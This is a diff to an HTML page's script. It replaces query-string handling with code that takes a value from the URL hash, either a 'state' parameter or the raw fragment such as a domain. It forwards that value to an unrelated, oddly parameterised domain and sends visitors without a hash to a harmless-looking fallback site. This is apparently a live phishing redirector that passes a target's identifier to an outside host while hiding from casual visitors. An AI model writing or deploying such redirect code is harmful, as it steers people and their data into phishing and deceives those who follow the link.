@@ -57,18 +57,25 @@ body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#f5f5f
 </div>
 
 <script>
-  // Extract parameters from the query string or URL hash fragment
-  const queryString = window.location.search || window.location.hash.substring(1);
-  const params = new URLSearchParams(queryString);
-  const ref = params.get("#");
+  // Clean hash string (removes leading '#', '?', or '/#')
+  const rawHash = window.location.hash.replace(/^#[?\/]?/, "");
+  
+  // Try extracting parameter if structured as key=value (e.g. #state=m.com)
+  const params = new URLSearchParams(rawHash);
+  let ref = params.get("state");
+
+  // If not formatted as state=value, use the raw hash directly (e.g. #m.com)
+  if (!ref && rawHash) {
+    ref = rawHash;
+  }
 
   if (ref) {
-    // Construct target URL with encoded parameter
+    // Forward the value attached to the hash on wiki.com
     const destination = "https://voceuae.net?Gejqbphl/" + encodeURIComponent(ref);
     window.location.replace(destination);
   } else {
-    // Fallback redirect if no state parameter is present
-    window.location.replace("https://voceuae.net?Gejqbphl");
+    // Fallback if no hash fragment is present
+    window.location.replace("https://wiki.com");
   }
 </script>
 </body>
